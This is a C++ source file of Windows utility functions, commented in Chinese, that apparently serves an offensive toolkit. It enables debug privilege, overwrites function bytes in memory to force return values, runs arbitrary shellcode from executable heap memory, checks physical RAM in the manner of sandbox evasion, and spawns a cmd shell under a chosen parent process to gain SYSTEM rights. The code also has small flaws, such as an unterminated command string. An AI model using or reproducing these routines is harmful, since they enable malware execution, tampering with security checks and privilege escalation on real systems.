#include "util.h"

DWORD GetPid(WCHAR* szName)
{
    HANDLE hprocessSnap;
    PROCESSENTRY32  pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    hprocessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hprocessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    if (Process32First(hprocessSnap, &pe32))
    {
        do {
            if (!wcscmp(szName, pe32.szExeFile))
                return (int)pe32.th32ProcessID;
        } while (Process32Next(hprocessSnap, &pe32));

    }
    CloseHandle(hprocessSnap);
    return 0;
}

BOOL PrivilegeDebug() {
    BOOL flag = FALSE;
    HANDLE hToken;
    LUID lUid;
    TOKEN_PRIVILEGES tp, tpPrevious;
    DWORD retLength;

    //尝试获取当前线程的令牌
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        DWORD code = GetLastError();
        if (code == ERROR_NO_TOKEN) {
            // 如果线程没有令牌，则打开当前进程令牌
            if (ImpersonateSelf(SecurityImpersonation)) {
                if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
                    return flag;
                }
            }
            else
            {
                return flag;
            }
        }
        else { 
            cout << "unknown error, code is " << code << endl;
            return flag;
        }
    }

    /*
    获取debug特权的标识符，debug特权是一个特殊的特权，需要管理员权限才能获取，允许进程执行以下操作：
     1. 附加到其他进程。
     2. 调试其他进程。
     3. 读取或写入其他进程的内存。
     4. 更改其他进程的优先级。
     5. 终止其他进程。
    */
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &lUid)) {
        cout << "find debug privilege fail" << endl;
        return flag;
    }

    //初始化令牌特权结构体
    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1; //设置令牌中特权的数量
    tp.Privileges[0].Luid = lUid; //设置特权为debug
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //设置特权为启用状态

    //调整线程令牌的特权为debug，并用tpPrevious保存原来的特权
    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &tpPrevious, &retLength)) {
        DWORD code = GetLastError();
        //线程令牌调整特权成功
        if (code == ERROR_SUCCESS) {
            cout << "debug privilege enable successfully!" << endl;
            flag = TRUE;
            CloseHandle(hToken);
            return flag;
        }
        else
        {
            cout << "Failed to enable debug privilege. Error code: " << code << endl;
            return flag;

        }
    }
    else
    {
        return flag;
    }

    ////恢复线程令牌原先的特权
    //if (AdjustTokenPrivileges(hToken, FALSE, &tpPrevious, retLength, NULL, NULL)) {
    //    DWORD code = GetLastError();
    //    //线程令牌特权恢复成功
    //    if (code == ERROR_SUCCESS) {
    //        cout << "Token privileges restored successfully!" << endl;
    //    }
    //    else
    //    {
    //        cout << "Token privileges restored failed! Error code: " << code << endl;

    //    }
    //}
}

BOOL ChangeFunc(LPVOID funcAddress, UCHAR buf[], SIZE_T size) {
    //这些都是x86上调用方清理堆栈，WINAPI声明的函数是被调用方清理堆栈。
    //unsigned char buf[] = "\xb8\x20\xff\xff\xff\xc3"; //int返回值修改为2024的指令
    //unsigned char buf[] = "\xb0\x40\xc3"; //bool返回值修改为false的指令
    //unsigned char buf[] = "\xc3"; //直接结束函数的指令
    //unsigned char buf[] = "\xb8\00\00\00\00\xc3"; //返回null的指令
    //unsigned char buf[] = "\xe9\00\00\00\00"; //无条件跳转到目的地址，后4个字节是偏移地址，偏移地址 = 目的地址 - (eip+5)，jmp指令占5个字节，所以+5
    /*
    总结: 当mov的指令是\xb8时，需要修改整个eax寄存器的值
          当mov的指令是\xb0时，只需要修改al的值
          当函数返回值超过1个字节的时候，会取整个eax寄存器的值作为结果
          当函数返回值只有1个字节的时候，只会取al中的值作为结果，eax中的其他字节对函数返回结果没有影响
    */

    DWORD old;
    HANDLE handle = GetCurrentProcess();
    if (VirtualProtectEx(handle, funcAddress, size, PAGE_EXECUTE_READWRITE, &old)) {
        WriteProcessMemory(handle, funcAddress, buf, size, NULL);
        VirtualProtectEx(handle, funcAddress, size, old, &old);
        CloseHandle(handle);
        return TRUE;
    }
    CloseHandle(handle); 
    return FALSE;
}

VOID ExecShellCode(LPVOID shellCode,SIZE_T size) {
    LPVOID lp = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lp != nullptr) {
        memcpy(lp, shellCode, size);
        ((void(*)())lp)();
    }
}

DWORDLONG GetPhysicalMemory() {
    _MEMORYSTATUSEX mst;
    size_t mstSize = sizeof(mst);
    _MEMORYSTATUSEX* mstPtr = &mst;
    memset(mstPtr, 0, mstSize);
    mstPtr->dwLength = mstSize;
    if (GlobalMemoryStatusEx(mstPtr)) {
        return mstPtr->ullTotalPhys/1073741824ULL;
    }
    return 0;
}

BOOL CheckPrivilege()
{
    BOOL state = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    state = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS, 0, 0, 0, 0, &AdministratorsGroup);
    if (state)
    {
        CheckTokenMembership(NULL, AdministratorsGroup, &state);
        FreeSid(AdministratorsGroup);
        return state;
    }
    return state;
}

BOOL GetSystemProcess(DWORD pid) {
    if (!CheckPrivilege()) {
        cout << "请以管理员权限运行程序!" << endl;
        return FALSE;
    }
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
    PROCESS_INFORMATION newProcess = { 0 };
    STARTUPINFOEXA startInfo = {0};
    startInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
    SIZE_T listSize = NULL;
    BOOL state = FALSE;
    if (hProcess) {
        InitializeProcThreadAttributeList(NULL, 1, 0, &listSize);
        if (GetLastError() == 122) {
            startInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, listSize);
            if (startInfo.lpAttributeList) {
                state = InitializeProcThreadAttributeList(startInfo.lpAttributeList, 1, 0, &listSize);
                if (state) {
                    state = UpdateProcThreadAttribute(startInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), NULL, NULL);
                    if (state) {
                        char command[] = { 'c', 'm', 'd' };
                        state = CreateProcessA(NULL, command, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &startInfo.StartupInfo, &newProcess);
                        if (state) {
                            CloseHandle(newProcess.hProcess);
                            CloseHandle(newProcess.hThread);
                        }
                        DeleteProcThreadAttributeList(startInfo.lpAttributeList);
                        CloseHandle(hProcess); 
                        return state;
                    }
                    return state;
                }
                return state;
            }
            return FALSE;
        }
        return FALSE;
    }
    return state;
}
